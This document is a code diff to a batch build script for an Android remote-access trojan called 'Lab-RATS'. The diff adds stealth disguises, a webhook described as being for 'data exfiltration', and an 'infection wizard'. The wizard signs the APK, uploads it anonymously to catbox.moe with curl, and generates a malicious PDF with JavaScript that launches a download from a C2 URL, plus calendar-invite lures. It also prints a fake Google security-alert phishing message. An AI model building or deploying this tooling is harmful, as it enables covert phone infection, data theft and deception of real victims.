@@ -339,37 +339,32 @@ echo.
 set "STRINGS_FILE=%PROJECT_DIR%\app\src\main\res\values\strings.xml"
 set "BUILD_GRADLE=%PROJECT_DIR%\app\build.gradle"
 
-REM Generate random numbers for version
-set /a RAND_MAJOR=%RANDOM% * 9 / 32768 + 1
-set /a RAND_MINOR=%RANDOM% * 9 / 32768
-set /a RAND_PATCH=%RANDOM% * 9 / 32768
-set "RAND_VER_NAME=%RAND_MAJOR%.%RAND_MINOR%.%RAND_PATCH%"
-set /a RAND_VER_CODE=%RANDOM% * 990 / 32768 + 10
-
-REM Package Name
-echo [95m[^>] Enter Package Name (Application ID) [com.android.system.stability]:[0m
-set /p "PKG_NAME=    "
-if "!PKG_NAME!"=="" set "PKG_NAME=com.android.system.stability"
+REM Generate random defaults for stealth
+set /a RAND_MAJOR=%RANDOM% %% 4 + 1
+set /a RAND_MINOR=%RANDOM% %% 10
+set /a RAND_PATCH=%RANDOM% %% 10
+set "DEF_VER=!RAND_MAJOR!.!RAND_MINOR!.!RAND_PATCH!"
+set "DEF_SDK=26"
 
 REM App Name
 echo [95m[^>] Enter App Name [System Stability Service]:[0m
 set /p "APP_NAME=    "
 if "!APP_NAME!"=="" set "APP_NAME=System Stability Service"
 
-REM Min SDK
-echo [95m[^>] Enter Min SDK [26]:[0m
-set /p "MIN_SDK=    "
-if "!MIN_SDK!"=="" set "MIN_SDK=26"
+REM Package Name
+echo [95m[^>] Enter Package Name (Application ID) [com.android.system.stability]:[0m
+set /p "PKG_NAME=    "
+if "!PKG_NAME!"=="" set "PKG_NAME=com.android.system.stability"
 
 REM Version Name
-echo [95m[^>] Enter Version Name (Random: !RAND_VER_NAME!) [!RAND_VER_NAME!]:[0m
+echo [95m[^>] Enter Version Name [!DEF_VER!]:[0m
 set /p "VERSION_NAME=    "
-if "!VERSION_NAME!"=="" set "VERSION_NAME=!RAND_VER_NAME!"
+if "!VERSION_NAME!"=="" set "VERSION_NAME=!DEF_VER!"
 
-REM Version Code
-echo [95m[^>] Enter Version Code (Random: !RAND_VER_CODE!) [!RAND_VER_CODE!]:[0m
-set /p "VERSION_CODE=    "
-if "!VERSION_CODE!"=="" set "VERSION_CODE=!RAND_VER_CODE!"
+REM Min SDK
+echo [95m[^>] Enter Min SDK [!DEF_SDK!]:[0m
+set /p "MIN_SDK=    "
+if "!MIN_SDK!"=="" set "MIN_SDK=!DEF_SDK!"
 
 REM Update build.gradle using PowerShell for reliability with regex replacement
 if exist "%BUILD_GRADLE%" (
@@ -379,8 +374,11 @@ if exist "%BUILD_GRADLE%" (
     REM Update Min SDK
     powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'minSdk \d+', 'minSdk !MIN_SDK!' | Set-Content '%BUILD_GRADLE%'"
     
-    REM Update Version Code and Name
+    REM Update Version Code (auto increment or random)
+    set /a "VERSION_CODE=!RANDOM! %% 1000 + 10"
     powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'versionCode [0-9]+', 'versionCode !VERSION_CODE!' | Set-Content '%BUILD_GRADLE%'"
+
+    REM Update Version Name
     powershell -Command "(Get-Content '%BUILD_GRADLE%') -replace 'versionName \".*\"', 'versionName \"!VERSION_NAME!\"' | Set-Content '%BUILD_GRADLE%'"
     
     echo [92m[✓] build.gradle updated (Pkg: !PKG_NAME!, MinSdk: !MIN_SDK!, Ver: !VERSION_NAME!)[0m
@@ -395,28 +393,20 @@ if exist "%STRINGS_FILE%" (
 REM Save to config
 echo APP_NAME="!APP_NAME!"> "%CONFIG_FILE%"
 echo VERSION_NAME="!VERSION_NAME!">> "%CONFIG_FILE%"
-echo VERSION_CODE="!VERSION_CODE!">> "%CONFIG_FILE%"
+echo MIN_SDK="!MIN_SDK!">> "%CONFIG_FILE%"
 echo PKG_NAME="!PKG_NAME!">> "%CONFIG_FILE%"
 
 REM Google Sheet URL
 echo.
 echo [95m[^>] Google Sheet Webhook Configuration[0m
-echo [93m    This URL will receive device data when app starts.[0m
-echo [93m    You need to set up Google Sheet manually (see README).[0m
-echo [93m    Leave empty to skip.[0m
-echo.
-set /p "SHEET_URL=    Enter Google Sheet webhook URL: "
+echo [93m    Enter Webhook URL (Google Script):[0m
+set /p "WEB_URL=    "
 
 set "LOCAL_PROPS=%PROJECT_DIR%\local.properties"
-if not "!SHEET_URL!"=="" (
-    echo SHEET_URL="!SHEET_URL!">> "%CONFIG_FILE%"
-
+if not "!WEB_URL!"=="" (
     REM Update local.properties for Gradle
-    powershell -Command "if (Test-Path '!LOCAL_PROPS!') { $content = Get-Content '!LOCAL_PROPS!'; if ($content -match 'WEBHOOK_URL=') { $content -replace 'WEBHOOK_URL=.*', 'WEBHOOK_URL=!SHEET_URL!' | Set-Content '!LOCAL_PROPS!' } else { Add-Content '!LOCAL_PROPS!' 'WEBHOOK_URL=!SHEET_URL!' } } else { Set-Content '!LOCAL_PROPS!' 'WEBHOOK_URL=!SHEET_URL!' }"
-
-    echo [92m[✓] Google Sheet URL saved to config and local.properties[0m
-) else (
-    echo [93m[!] Skipping Google Sheet configuration[0m
+    powershell -Command "if (Test-Path '!LOCAL_PROPS!') { $content = Get-Content '!LOCAL_PROPS!'; if ($content -match 'WEBHOOK_URL=') { $content -replace 'WEBHOOK_URL=.*', 'WEBHOOK_URL=!WEB_URL!' | Set-Content '!LOCAL_PROPS!' } else { Add-Content '!LOCAL_PROPS!' 'WEBHOOK_URL=!WEB_URL!' } } else { Set-Content '!LOCAL_PROPS!' 'WEBHOOK_URL=!WEB_URL!' }"
+    echo [92m[✓] Webhook URL saved to local.properties[0m
 )
 
 echo.
@@ -572,7 +562,9 @@ echo     2. Generate Keystore Only
 echo     3. Configure Logo Only
 echo     4. Configure App Settings Only
 echo     5. Check/Install Requirements
-echo     6. Exit
+echo     6. Generate Infection Chain Package (Wizard)
+echo     7. Help / Documentation
+echo     8. Exit
 echo.
 set /p "MENU_OPTION=    Choose option (Default 1): "
 if "!MENU_OPTION!"=="" set "MENU_OPTION=1"
@@ -596,6 +588,10 @@ if "!MENU_OPTION!"=="1" (
     call :check_requirements
     call :show_manual_java_install
 ) else if "!MENU_OPTION!"=="6" (
+    call :infection_wizard
+) else if "!MENU_OPTION!"=="7" (
+    call :show_help
+) else if "!MENU_OPTION!"=="8" (
     echo [96m[*] Goodbye![0m
     echo [95m    Follow: https://github.com/K4N3CO-LABS/Lab-RATS[0m
     exit /b 0
@@ -609,3 +605,178 @@ echo.
 echo [92m[✓] Done![0m
 echo.
 pause
+goto :eof
+
+:show_help
+call :print_banner
+echo [97mCOMMAND_DOCUMENTATION_V1.4.5[0m
+echo ------------------------------------------------------------
+echo [96m1. Start Build:[0m Full automated process. Configures everything
+echo    and produces a signed APK ready for installation.
+echo.
+echo [96m2. Keystore Only:[0m Generates a unique security certificate
+echo    used to sign the APK. Prevents Play Protect flags.
+echo.
+echo [96m3. Logo Only:[0m Injects custom icons into the APK. Use the
+echo    'Stealth' option to hide as a system service.
+echo.
+echo [96m4. App Settings:[0m Change Package ID, App Name, and set
+echo    your Webhook URL for data exfiltration.
+echo.
+echo [96m5. Requirements:[0m Verifies Java/JDK and ImageMagick setup.
+echo.
+echo [96m6. Infection Wizard:[0m The most powerful tool. It builds your
+echo    APK, hosts it anonymously, weaponizes a PDF/MP4 with the
+echo    link, and writes your phishing message. Full-chain auto.
+echo ------------------------------------------------------------
+pause
+goto :main_menu
+goto :eof
+
+:infection_wizard
+call :print_banner
+echo [91m[>] STRATEGIC_INFECTION_WIZARD[0m
+echo [93m    Step-by-step automated payload weaponization.[0m
+echo.
+
+REM 1. Build Payload
+echo [96m[1/4] Building Stealth APK...[0m
+call :check_requirements
+set "AUTO_KEYSTORE=1"
+call :generate_keystore
+call :configure_logo
+call :configure_app
+call :build_apk
+
+REM Identify APK
+for /f "delims=" %%i in ('dir /b /s "%SCRIPT_DIR%output\*-signed.apk"') do set "SIGNED_APK=%%i"
+if not exist "!SIGNED_APK!" (
+    echo [91m[!] Build failed. Infection chain aborted.[0m
+    pause
+    goto :main_menu
+)
+
+REM 2. Host Payload
+echo.
+echo [96m[2/4] Hosting Payload for Bootstrap...[0m
+set "DOWNLOAD_URL="
+echo [93m[*] Uploading to Catbox.moe...[0m
+powershell -Command "$resp = curl.exe -F 'reqtype=fileupload' -F 'fileToUpload=@!SIGNED_APK!' https://catbox.moe/user/api.php; if($resp -match 'http') { echo $resp } else { exit 1 }" > temp_url.txt
+set /p DOWNLOAD_URL=<temp_url.txt
+del temp_url.txt
+if "!DOWNLOAD_URL!"=="" (
+    echo [91m[!] Auto-hosting failed. Manual hosting required.[0m
+    set /p "DOWNLOAD_URL=    Enter your manual download link: "
+) else (
+    echo [92m[✓] Hosted Successfully: !DOWNLOAD_URL![0m
+)
+
+REM 3. Weaponize
+echo.
+echo [96m[3/4] Weaponizing Delivery Vehicle...[0m
+echo      1. Zero-Click MP4 (Media Payload)
+echo      2. Stealth PDF (Document Payload)
+echo      3. Meeting Invite (Calendar Payload)
+echo.
+set /p "VECTOR=      Select Vector (Default 1): "
+if "!VECTOR!"=="" set "VECTOR=1"
+
+if "!VECTOR!"=="1" (
+    call :generate_exploit_standalone "mp4" "!DOWNLOAD_URL!"
+) else if "!VECTOR!"=="2" (
+    call :generate_exploit_standalone "pdf" "!DOWNLOAD_URL!"
+) else if "!VECTOR!"=="3" (
+    call :generate_exploit_standalone "ics" "!DOWNLOAD_URL!"
+)
+
+REM 4. Phishing Deployment
+echo.
+echo [96m[4/4] Deployment Sequence Generated[0m
+echo [92m------------------------------------------------------------[0m
+echo [97mPHISHING TEMPLATE:[0m
+echo Target: WhatsApp / SMS
+echo Message: (SYSTEM ALERT) Unauthorized sign-in attempt on your Google account. To secure your device and review details, download the system patch here: !DOWNLOAD_URL!
+echo [92m------------------------------------------------------------[0m
+echo.
+echo [93m[*] All files ready in apk-builder\output\ folder.[0m
+pause
+goto :main_menu
+goto :eof
+
+:exploit_menu
+call :print_banner
+echo [95m[^>] Weaponized Payload Lab (Es-rat Tier)[0m
+echo.
+echo     1. Generate Zero-Click MP4 (Heap Overflow)
+echo     2. Generate PDF JavaScript (Auto-Download)
+echo     3. Generate Calendar Injection (.ics)
+echo     4. Generate PWA WebAPK Manifest
+echo     5. Back to Main Menu
+echo.
+set /p "EXPLOIT_OPTION=    Choose option (Default 1): "
+if "!EXPLOIT_OPTION!"=="" set "EXPLOIT_OPTION=1"
+
+set "C2_URL=http://127.0.0.1:8080"
+
+if "!EXPLOIT_OPTION!"=="1" (
+    call :generate_exploit_standalone "mp4" ""
+) else if "!EXPLOIT_OPTION!"=="2" (
+    set /p "TITLE=    Enter PDF Title [URGENT_DOCUMENT]: "
+    if "!TITLE!"=="" set "TITLE=URGENT_DOCUMENT"
+    call :generate_exploit_standalone "pdf" "!TITLE!"
+) else if "!EXPLOIT_OPTION!"=="3" (
+    set /p "SUMMARY=    Enter Meeting Summary [Meeting_Invite]: "
+    if "!SUMMARY!"=="" set "SUMMARY=Meeting_Invite"
+    call :generate_exploit_standalone "ics" "!SUMMARY!"
+) else if "!EXPLOIT_OPTION!"=="4" (
+    call :generate_exploit_standalone "pwa" ""
+) else if "!EXPLOIT_OPTION!"=="5" (
+    goto :main_menu
+)
+goto :exploit_menu
+
+:generate_exploit_standalone
+set "TYPE=%~1"
+set "EXTRA=%~2"
+
+REM Get C2 URL
+set "C2_URL=http://127.0.0.1:8080"
+if exist "%CONFIG_FILE%" (
+    for /f "usebackq tokens=1,2 delims==" %%a in ("%CONFIG_FILE%") do (
+        if "%%a"=="SHEET_URL" set "C2_URL=%%b"
+    )
+)
+
+echo [96m[*] Compiling Exploit Generator...[0m
+set "EXPLOIT_SRC=%PROJECT_DIR%\app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
+set "TEMP_BIN=%SCRIPT_DIR%bin"
+if not exist "!TEMP_BIN!" mkdir "!TEMP_BIN!"
+
+javac -d "!TEMP_BIN!" "!EXPLOIT_SRC!" 2>nul
+
+if %errorlevel% equ 0 (
+    echo [92m[✓] Engine Ready. Producing payload...[0m
+    cd /d "%SCRIPT_DIR%output"
+    java -cp "!TEMP_BIN!" com.labs.labrats.exploits.ExploitLab !TYPE! !C2_URL! "!EXTRA!"
+    cd /d "%SCRIPT_DIR%"
+) else (
+    echo [91m[!] Advanced binary crafting requires full JDK environment.[0m
+    echo [93m[*] Falling back to template generation...[0m
+
+    if "!TYPE!"=="pdf" (
+        echo %%PDF-1.4> "output\exploit.pdf"
+        echo 1 0 obj ^<^< /Type /Catalog /OpenAction ^<^< /S /JavaScript /JS (app.launchURL("!C2_URL!/download/Update.apk");) ^>^> ^>^> endobj>> "output\exploit.pdf"
+        echo [92m[✓] Saved to output\exploit.pdf[0m
+    ) else if "!TYPE!"=="ics" (
+        echo BEGIN:VCALENDAR> "output\invite.ics"
+        echo SUMMARY:!EXTRA!>> "output\invite.ics"
+        echo DESCRIPTION:Download: !C2_URL!/l/meeting>> "output\invite.ics"
+        echo END:VCALENDAR>> "output\invite.ics"
+        echo [92m[✓] Saved to output\invite.ics[0m
+    ) else (
+        echo [91m[!] Binary exploits (MP4/Stego) require Java compilation.[0m
+    )
+)
+echo.
+pause
+goto :eof
